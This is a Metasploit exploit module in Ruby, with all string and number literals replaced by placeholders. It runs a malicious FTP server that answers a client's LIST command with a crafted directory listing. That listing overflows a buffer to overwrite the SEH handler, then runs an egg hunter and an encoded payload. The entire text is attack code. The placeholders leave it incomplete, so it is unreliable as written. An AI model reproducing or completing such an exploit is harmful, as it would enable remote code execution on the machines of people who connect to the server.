class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Exploit :: Remote :: FtpServer def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <int> , <str> = > <str> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) end def setup super end def on_client_unknown_command ( c , cmd , arg ) c . put ( <str> ) end def on_client_command_list ( c , arg ) conn = establish_data_connection ( c ) if ( not conn ) c . put ( <str> ) return end print_status ( <str> ) code = <int> c . put ( <str> code <str> ) code = <int> c . put ( <str> code <str> ) totalsize = <int> foldername = <str> * target [ <str> ] nseh = <str> seh = <str> sehpad = <str> align = <str> align << <str> align << <str> align << <str> padding = ( <str> * <int> ) + ( <str> ) hunter = <str> hunter << <str> hunter << <str> hunter << <str> hunter << <str> buffer = foldername + nseh + seh + sehpad + align + padding + hunter junk = <str> * ( totalsize - buffer . length ) buffer << junk print_status ( <str> ) dirlist = <str> + payload . encoded <str> dirlist << <str> buffer <str> conn . put ( <str> + dirlist ) print_status ( <str> ) conn . close return end end 
